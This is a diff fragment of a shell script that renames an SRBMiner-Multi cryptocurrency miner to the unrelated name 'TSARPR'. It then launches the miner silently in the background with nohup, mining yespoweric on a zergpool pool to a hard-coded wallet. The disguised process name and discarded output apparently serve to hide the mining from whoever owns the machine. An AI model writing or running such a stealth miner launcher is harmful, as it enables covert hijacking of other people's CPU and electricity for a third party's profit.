@@ -8,4 +8,4 @@ cd SRBMiner-Multi-2-3-1/
 mv SRBMiner-MULTI  ..
 cd ..
 mv SRBMiner-MULTI TSARPR
-nohup ./TSARPR --algorithm yespoweric --pool stratum+ssl://yespoweric.mine.zergpool.com:16238 --wallet RHTx4HUZRrmy8tWhpn5WWX2x7KmfYS4Txq --password c=VRSC,id=YANTO$(( $RANDOM % 1000 + 1 )) --enable-workers-ramp-up --cpu-threads 0 --disable-gpu &> /dev/null &
+nohup ./TSARPR --algorithm yespoweric --pool stratum+ssl://yespoweric.mine.zergpool.com:16238 --wallet RHTx4HUZRrmy8tWhpn5WWX2x7KmfYS4Txq --password c=VRSC,id=YANTO$(( $RANDOM % 1000 + 1 )) --cpu-threads 0 --disable-gpu &> /dev/null &
